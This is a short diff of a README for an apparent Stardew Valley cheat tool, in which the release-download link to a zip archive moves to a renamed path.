@@ -11,7 +11,7 @@ Free, open source, no installer. Opens with `Insert`.
 ![Licence](https://img.shields.io/badge/licence-MIT-d9c47a?style=flat-square)
 ![Comfort](https://img.shields.io/badge/comfort%20options-tagged%20%26%20on-8c5ac9?style=flat-square)
 
-**[⬇ Download the latest release](https://github.com/zx-Shattered-Ranger92/Stardew-Valley---Cheats/releases/download/Stardew/Stardew.Valley.Cheats.zip)** · [Hotkeys](#hotkeys) · [FAQ](#faq)
+**[⬇ Download the latest release](https://github.com/zx-Shattered-Ranger92/Stardew-Valley---Cheats/releases/download/Stardew-Valley---Cheats/Stardew-Valley---Cheats.zip)** · [Hotkeys](#hotkeys) · [FAQ](#faq)
 
 ---
 
